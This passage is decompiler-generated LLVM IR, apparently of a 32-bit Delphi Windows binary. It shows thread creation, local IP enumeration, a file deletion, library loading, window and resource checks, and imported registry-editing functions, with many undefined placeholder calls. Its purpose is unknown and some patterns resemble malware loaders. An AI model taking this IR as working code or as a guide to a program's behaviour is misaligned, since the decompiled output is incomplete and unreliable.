  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2021
  br label %dec_label_pc_407997, !insn.addr !2021

dec_label_pc_4078fa:                              ; preds = %dec_label_pc_4078e6
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2022
  %12 = icmp eq i8 %11, 0, !insn.addr !2022
  br i1 %12, label %dec_label_pc_407923, label %dec_label_pc_407904, !insn.addr !2023

dec_label_pc_407904:                              ; preds = %dec_label_pc_4078fa
  %13 = call i32 @function_4071bc(), !insn.addr !2024
  %14 = icmp eq i32 %13, 0, !insn.addr !2025
  br i1 %14, label %dec_label_pc_407923, label %dec_label_pc_40791c, !insn.addr !2026

dec_label_pc_40791c:                              ; preds = %dec_label_pc_407904
  %15 = call i32 @function_4079d4(), !insn.addr !2027
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2028
  br label %dec_label_pc_407997, !insn.addr !2028

dec_label_pc_407923:                              ; preds = %dec_label_pc_407904, %dec_label_pc_4078fa
  %16 = call i32 @"@LStrCatN"(), !insn.addr !2029
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2030
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4221088 to i32*), i32 0, i32* null), !insn.addr !2031
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4221088 to i32*), i32 0, i32* null), !insn.addr !2032
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !2033
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !2033
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4221088 to i32*), i32 0, i32* null), !insn.addr !2034
  %23 = call i32 @function_4079d4(), !insn.addr !2035
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !2035
  br label %dec_label_pc_407997, !insn.addr !2035

dec_label_pc_407997:                              ; preds = %dec_label_pc_407923, %dec_label_pc_40791c, %dec_label_pc_4078f0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !2036
  %25 = load i32, i32* %24, align 4, !insn.addr !2036
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !2037
  %26 = add i32 %esp.0.reload, 8, !insn.addr !2038
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2038
  store i32 4225460, i32* %27, align 4, !insn.addr !2038
  %28 = call i32 @"@LStrClr"(), !insn.addr !2039
  ret i32 %28, !insn.addr !2040
}

define i32 @function_4079ad() local_unnamed_addr {
dec_label_pc_4079ad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2041
  ret i32 %0, !insn.addr !2041
}

define i32 @function_4079b2() local_unnamed_addr {
dec_label_pc_4079b2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2042
}

define i32 @function_4079b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4079b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2043
}

define i32 @function_4079d4() local_unnamed_addr {
dec_label_pc_4079d4:
  %0 = call i32 @"@LStrClr"(), !insn.addr !2044
  %1 = call i32 @"@LStrClr"(), !insn.addr !2045
  ret i32 %1, !insn.addr !2046
}

define i32 @function_4079ec() local_unnamed_addr {
dec_label_pc_4079ec:
  %eax.0.reg2mem = alloca i32, !insn.addr !2047
  %esp.0.reg2mem = alloca i32, !insn.addr !2047
  %esp.15.reg2mem = alloca i32, !insn.addr !2047
  %storemerge6.reg2mem = alloca i32, !insn.addr !2047
  %.reg2mem = alloca i32, !insn.addr !2047
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !2047
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !2048
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !2049
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !2050
  %5 = call i32 @"@LStrClr"(), !insn.addr !2051
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !2052
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !2052
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !2053
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !2054
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !2055
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !2055
  %11 = icmp eq %hostent* %9, null, !insn.addr !2056
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2057
  br i1 %11, label %dec_label_pc_407a4a, label %dec_label_pc_407a24, !insn.addr !2057

dec_label_pc_407a24:                              ; preds = %dec_label_pc_4079ec
  %12 = add i32 %10, 12, !insn.addr !2058
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2058
  %14 = load i32, i32* %13, align 4, !insn.addr !2058
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2059
  %16 = load i32, i32* %15, align 4, !insn.addr !2059
  %17 = icmp eq i32 %16, 0, !insn.addr !2060
  %18 = icmp eq i1 %17, false, !insn.addr !2061
  br i1 %18, label %dec_label_pc_407a2b.lr.ph, label %dec_label_pc_407a45, !insn.addr !2061

dec_label_pc_407a2b.lr.ph:                        ; preds = %dec_label_pc_407a24
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !2054
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_407a2b

dec_label_pc_407a2b:                              ; preds = %dec_label_pc_407a2b.lr.ph, %dec_label_pc_407a3d
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !2062
  %21 = icmp eq i1 %20, false, !insn.addr !2063
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !2063
  br i1 %21, label %dec_label_pc_407a3d, label %dec_label_pc_407a2f, !insn.addr !2063

dec_label_pc_407a2f:                              ; preds = %dec_label_pc_407a2b
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !2064
  %23 = load i32, i32* %22, align 4, !insn.addr !2064
  %24 = add i32 %esp.15.reload, -4, !insn.addr !2064
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2064
  store i32 %23, i32* %25, align 4, !insn.addr !2064
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !2065
  %27 = call i32 @StrPas(), !insn.addr !2066
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !2066
  br label %dec_label_pc_407a3d, !insn.addr !2066

dec_label_pc_407a3d:                              ; preds = %dec_label_pc_407a2f, %dec_label_pc_407a2b
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !2067
  %29 = mul i32 %28, 4, !insn.addr !2059
  %30 = add i32 %29, %14, !insn.addr !2059
  %31 = inttoptr i32 %30 to i32*, !insn.addr !2059
  %32 = load i32, i32* %31, align 4, !insn.addr !2059
  %33 = icmp eq i32 %32, 0, !insn.addr !2060
  %34 = icmp eq i1 %33, false, !insn.addr !2061
  store i32 %32, i32* %.reg2mem, !insn.addr !2061
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !2061
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !2061
  br i1 %34, label %dec_label_pc_407a2b, label %dec_label_pc_407a45, !insn.addr !2061

dec_label_pc_407a45:                              ; preds = %dec_label_pc_407a3d, %dec_label_pc_407a24
  %35 = call i32 @WSACleanup(), !insn.addr !2068
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !2068
  br label %dec_label_pc_407a4a, !insn.addr !2068

dec_label_pc_407a4a:                              ; preds = %dec_label_pc_407a45, %dec_label_pc_4079ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2069
}

define i32 @function_407a58() local_unnamed_addr {
dec_label_pc_407a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2070
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2070
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2070
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2071
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2072
  %3 = add i32 %2, 1, !insn.addr !2072
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !2072
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2073
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2074
  ret i32 0, !insn.addr !2075
}

define i32 @function_407a7d() local_unnamed_addr {
dec_label_pc_407a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2076
  ret i32 %0, !insn.addr !2076
}

define i32 @function_407a82() local_unnamed_addr {
dec_label_pc_407a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2077
}

define i32 @function_407a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2078
}

define i32 @function_407a88() local_unnamed_addr {
dec_label_pc_407a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2079
  %2 = add i32 %1, -1, !insn.addr !2079
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !2079
  ret i32 %0, !insn.addr !2080
}

define i32 @function_407a90() local_unnamed_addr {
dec_label_pc_407a90:
  %stack_var_-24 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2081
  store i32 %0, i32* %stack_var_-24, align 4, !insn.addr !2081
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !2081
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2082
  %2 = call i32 @"@LStrLAsg"(), !insn.addr !2083
  %3 = load i32, i32* %stack_var_-24, align 4, !insn.addr !2084
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2085
  %4 = call i32 @"@LStrArrayClr"(), !insn.addr !2086
  ret i32 %4, !insn.addr !2087
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2088
  ret i32 %0, !insn.addr !2088
}

define i32 @function_407ad9() local_unnamed_addr {
dec_label_pc_407ad9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2089
}

define i32 @function_407adb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407adb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2090
}

define i32 @SetFieldText.51() local_unnamed_addr {
dec_label_pc_407aff:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2091
  ret i32 %0, !insn.addr !2091
}

define i32 @function_407b04() local_unnamed_addr {
dec_label_pc_407b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2092
}

define i32 @function_407b06(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b06:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2093
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407bf0:
  %esp.2.reg2mem = alloca i32, !insn.addr !2094
  %esp.1.reg2mem = alloca i32, !insn.addr !2094
  %esp.0.reg2mem = alloca i32, !insn.addr !2094
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2095
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2096
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2096
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2096
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2097
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2098
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f0 to i8*), i32 0), !insn.addr !2099
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2100
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2100
  store i8 0, i8* %6, align 1, !insn.addr !2100
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2101
  %8 = call i32 @function_4075e4(), !insn.addr !2102
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2103
  %10 = call i32 @"@LStrAsg"(), !insn.addr !2104
  %11 = call i32 @"@LStrAsg"(), !insn.addr !2105
  %12 = call i32 @function_40765c(), !insn.addr !2106
  %13 = trunc i32 %12 to i8, !insn.addr !2107
  %14 = icmp eq i8 %13, 0, !insn.addr !2107
  br i1 %14, label %dec_label_pc_407d17, label %dec_label_pc_407c9c, !insn.addr !2108

dec_label_pc_407c9c:                              ; preds = %dec_label_pc_407bf0
  %15 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2109
  %16 = inttoptr i32 %15 to i32*, !insn.addr !2110
  store i32 -1, i32* %16, align 4, !insn.addr !2110
  %17 = call i32 @"@LStrFromArray"(), !insn.addr !2111
  %18 = call i32 @function_407624(), !insn.addr !2112
  %19 = call i32 @"@LStrAsg"(), !insn.addr !2113
  %20 = call i32 @"@LStrCat3"(), !insn.addr !2114
  %21 = call i32 @function_4036f4(), !insn.addr !2115
  %22 = inttoptr i32 %21 to i8*, !insn.addr !2116
  %23 = call i1 @DeleteFileA(i8* %22), !insn.addr !2117
  %24 = call i32 @"@LStrCat3"(), !insn.addr !2118
  %25 = call i32 @function_4036f4(), !insn.addr !2119
  %26 = inttoptr i32 %25 to i8*, !insn.addr !2120
  store i8* %26, i8** %stack_var_-136, align 4, !insn.addr !2120
  %27 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2120
  %28 = call i32* @LoadLibraryA(i8* %26), !insn.addr !2121
  %29 = ptrtoint i32* %28 to i32, !insn.addr !2121
  store i32 %29, i32* @global_var_408118, align 4, !insn.addr !2122
  store i32 %27, i32* %esp.0.reg2mem, !insn.addr !2123
  br label %dec_label_pc_407d44, !insn.addr !2123

dec_label_pc_407d17:                              ; preds = %dec_label_pc_407bf0
  %30 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2098
  %31 = call i32 @function_406648(), !insn.addr !2124
  %32 = call i32 @function_40765c(), !insn.addr !2125
  %33 = trunc i32 %32 to i8, !insn.addr !2126
  %34 = icmp eq i8 %33, 0, !insn.addr !2126
  store i32 %30, i32* %esp.2.reg2mem, !insn.addr !2127
  br i1 %34, label %dec_label_pc_407e86, label %dec_label_pc_407d39, !insn.addr !2127

dec_label_pc_407d39:                              ; preds = %dec_label_pc_407d17
  %35 = load i32, i32* @global_var_408138, align 4, !insn.addr !2128
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2129
  store i32 -1, i32* %36, align 4, !insn.addr !2129
  store i32 %30, i32* %esp.0.reg2mem, !insn.addr !2129
  br label %dec_label_pc_407d44, !insn.addr !2129

dec_label_pc_407d44:                              ; preds = %dec_label_pc_407d39, %dec_label_pc_407c9c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %37 = add i32 %esp.0.reload, -4, !insn.addr !2130
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2130
  store i32 260, i32* %38, align 4, !insn.addr !2130
  %39 = add i32 %esp.0.reload, -8, !insn.addr !2131
  %40 = inttoptr i32 %39 to i32*, !insn.addr !2131
  store i32 ptrtoint (i8** @global_var_4096f0 to i32), i32* %40, align 4, !insn.addr !2131
  %41 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2132
  %42 = ptrtoint i32 (i32, i32, i32)* %41 to i32, !insn.addr !2132
  %43 = add i32 %esp.0.reload, -12, !insn.addr !2133
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2133
  store i32 %42, i32* %44, align 4, !insn.addr !2133
  %45 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2134
  %46 = add i32 %45, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2135
  %47 = inttoptr i32 %46 to i8*, !insn.addr !2135
  store i8 0, i8* %47, align 1, !insn.addr !2135
  %48 = call i32 @"@LStrFromArray"(), !insn.addr !2136
  %49 = call i32 @function_407624(), !insn.addr !2137
  %50 = call i32 @"@LStrAsg"(), !insn.addr !2138
  %51 = call i32 @"@LStrCat3"(), !insn.addr !2139
  %52 = load i32, i32* @global_var_408138, align 4, !insn.addr !2140
  %53 = icmp eq i32 %52, 0, !insn.addr !2140
  br i1 %53, label %dec_label_pc_407ddd, label %dec_label_pc_407daa, !insn.addr !2141

dec_label_pc_407daa:                              ; preds = %dec_label_pc_407d44
  %54 = add i32 %esp.0.reload, -16, !insn.addr !2142
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2142
  store i32 ptrtoint ([16 x i8]* @global_var_407f08 to i32), i32* %55, align 4, !insn.addr !2142
  %56 = add i32 %esp.0.reload, -20, !insn.addr !2143
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2143
  store i32 ptrtoint ([8 x i8]* @global_var_407f18 to i32), i32* %57, align 4, !insn.addr !2143
  %58 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2144
  %59 = icmp eq i32* %58, null, !insn.addr !2145
  %60 = icmp eq i1 %59, false, !insn.addr !2146
  store i32 %56, i32* %esp.2.reg2mem, !insn.addr !2146
  br i1 %60, label %dec_label_pc_407e86, label %dec_label_pc_407dc1, !insn.addr !2146

dec_label_pc_407dc1:                              ; preds = %dec_label_pc_407daa
  %61 = add i32 %esp.0.reload, -24, !insn.addr !2147
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2147
  store i32 ptrtoint (i32* @global_var_409810 to i32), i32* %62, align 4, !insn.addr !2147
  %63 = add i32 %esp.0.reload, -28, !insn.addr !2148
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2148
  store i32 0, i32* %64, align 4, !insn.addr !2148
  %65 = add i32 %esp.0.reload, -32, !insn.addr !2149
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2149
  store i32 66, i32* %66, align 4, !insn.addr !2149
  %67 = add i32 %esp.0.reload, -36, !insn.addr !2150
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2150
  store i32 4222148, i32* %68, align 4, !insn.addr !2150
  %69 = add i32 %esp.0.reload, -40, !insn.addr !2151
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2151
  store i32 0, i32* %70, align 4, !insn.addr !2151
  %71 = add i32 %esp.0.reload, -44, !insn.addr !2152
  %72 = inttoptr i32 %71 to i32*, !insn.addr !2152
  store i32 0, i32* %72, align 4, !insn.addr !2152
  %73 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2153
  store i32 %71, i32* %esp.2.reg2mem, !insn.addr !2154
  br label %dec_label_pc_407e86, !insn.addr !2154

dec_label_pc_407ddd:                              ; preds = %dec_label_pc_407d44
  %74 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2155
  %75 = icmp eq i32 %74, 0, !insn.addr !2155
  store i32 %43, i32* %esp.2.reg2mem, !insn.addr !2156
  br i1 %75, label %dec_label_pc_407e86, label %dec_label_pc_407deb, !insn.addr !2156

dec_label_pc_407deb:                              ; preds = %dec_label_pc_407ddd
  %76 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2157
  %77 = icmp eq i8 %76, 0, !insn.addr !2157
  br i1 %77, label %dec_label_pc_407dfa, label %dec_label_pc_407df5, !insn.addr !2158

dec_label_pc_407df5:                              ; preds = %dec_label_pc_407deb
  %78 = call i32 @function_406e84(), !insn.addr !2159
  br label %dec_label_pc_407dfa, !insn.addr !2159

dec_label_pc_407dfa:                              ; preds = %dec_label_pc_407df5, %dec_label_pc_407deb
  %79 = load i32, i32* @global_var_408148, align 4, !insn.addr !2160
  %80 = icmp slt i32 %79, 1, !insn.addr !2161
  br i1 %80, label %dec_label_pc_407e37, label %dec_label_pc_407e04, !insn.addr !2161

dec_label_pc_407e04:                              ; preds = %dec_label_pc_407dfa
  %81 = call i32 @function_405290(), !insn.addr !2162
  %82 = call i32 @"@LStrCmp"(), !insn.addr !2163
  %83 = load i32, i32* @global_var_408154, align 4, !insn.addr !2164
  %84 = inttoptr i32 %83 to i32*, !insn.addr !2165
  store i32 -1, i32* %84, align 4, !insn.addr !2165
  %85 = load i32, i32* @global_var_408154, align 4, !insn.addr !2166
  %86 = icmp eq i32 %85, 0, !insn.addr !2166
  br i1 %86, label %dec_label_pc_407e37, label %dec_label_pc_407e32, !insn.addr !2167

dec_label_pc_407e32:                              ; preds = %dec_label_pc_407e04
  %87 = call i32 @function_406564(), !insn.addr !2168
  br label %dec_label_pc_407e37, !insn.addr !2168

dec_label_pc_407e37:                              ; preds = %dec_label_pc_407e32, %dec_label_pc_407e04, %dec_label_pc_407dfa
  %88 = add i32 %esp.0.reload, -16, !insn.addr !2169
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2169
  store i32 3, i32* %89, align 4, !insn.addr !2169
  %90 = add i32 %esp.0.reload, -20, !insn.addr !2170
  %91 = inttoptr i32 %90 to i32*, !insn.addr !2170
  store i32 16065, i32* %91, align 4, !insn.addr !2170
  %92 = load i32, i32* @global_var_408118, align 4, !insn.addr !2171
  %93 = add i32 %esp.0.reload, -24, !insn.addr !2172
  %94 = inttoptr i32 %93 to i32*, !insn.addr !2172
  store i32 %92, i32* %94, align 4, !insn.addr !2172
  %95 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2173
  %96 = icmp eq i32* %95, null, !insn.addr !2174
  %97 = icmp eq i1 %96, false, !insn.addr !2175
  store i32 %93, i32* %esp.1.reg2mem, !insn.addr !2175
  br i1 %97, label %dec_label_pc_407e77, label %dec_label_pc_407e4d, !insn.addr !2175

dec_label_pc_407e4d:                              ; preds = %dec_label_pc_407e37
  %98 = add i32 %esp.0.reload, -28, !insn.addr !2176
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2176
  store i32 14, i32* %99, align 4, !insn.addr !2176
  %100 = add i32 %esp.0.reload, -32, !insn.addr !2177
  %101 = inttoptr i32 %100 to i32*, !insn.addr !2177
  store i32 16065, i32* %101, align 4, !insn.addr !2177
  %102 = load i32, i32* @global_var_408118, align 4, !insn.addr !2178
  %103 = add i32 %esp.0.reload, -36, !insn.addr !2179
  %104 = inttoptr i32 %103 to i32*, !insn.addr !2179
  store i32 %102, i32* %104, align 4, !insn.addr !2179
  %105 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2180
  %106 = icmp eq i32* %105, null, !insn.addr !2181
  %107 = icmp eq i1 %106, false, !insn.addr !2182
  store i32 %103, i32* %esp.1.reg2mem, !insn.addr !2182
  br i1 %107, label %dec_label_pc_407e77, label %dec_label_pc_407e63, !insn.addr !2182

dec_label_pc_407e63:                              ; preds = %dec_label_pc_407e4d
  %108 = add i32 %esp.0.reload, -40, !insn.addr !2183
  %109 = inttoptr i32 %108 to i32*, !insn.addr !2183
  store i32 16065, i32* %109, align 4, !insn.addr !2183
  %110 = load i32, i32* @global_var_408118, align 4, !insn.addr !2184
  %111 = add i32 %esp.0.reload, -44, !insn.addr !2185
  %112 = inttoptr i32 %111 to i32*, !insn.addr !2185
  store i32 %110, i32* %112, align 4, !insn.addr !2185
  %113 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2186
  %114 = icmp eq i32* %113, null, !insn.addr !2187
  store i32 %111, i32* %esp.1.reg2mem, !insn.addr !2188
  store i32 %111, i32* %esp.2.reg2mem, !insn.addr !2188
  br i1 %114, label %dec_label_pc_407e86, label %dec_label_pc_407e77, !insn.addr !2188

dec_label_pc_407e77:                              ; preds = %dec_label_pc_407e63, %dec_label_pc_407e4d, %dec_label_pc_407e37
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %115 = call i32 @function_404e24(), !insn.addr !2189
  store i32 4225680, i32* @global_var_409654, align 4, !insn.addr !2190
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2190
  br label %dec_label_pc_407e86, !insn.addr !2190

dec_label_pc_407e86:                              ; preds = %dec_label_pc_407e77, %dec_label_pc_407e63, %dec_label_pc_407ddd, %dec_label_pc_407dc1, %dec_label_pc_407daa, %dec_label_pc_407d17
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %116 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2191
  %117 = load i32, i32* %116, align 4, !insn.addr !2191
  call void @__writefsdword(i32 0, i32 %117), !insn.addr !2192
  %118 = add i32 %esp.2.reload, 8, !insn.addr !2193
  %119 = inttoptr i32 %118 to i32*, !insn.addr !2193
  store i32 4226728, i32* %119, align 4, !insn.addr !2193
  %120 = call i32 @"@LStrArrayClr"(), !insn.addr !2194
  ret i32 %120, !insn.addr !2195
}

define i32 @function_407ea1() local_unnamed_addr {
dec_label_pc_407ea1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2196
  ret i32 %0, !insn.addr !2196
}

define i32 @function_407ea6() local_unnamed_addr {
dec_label_pc_407ea6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2197
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

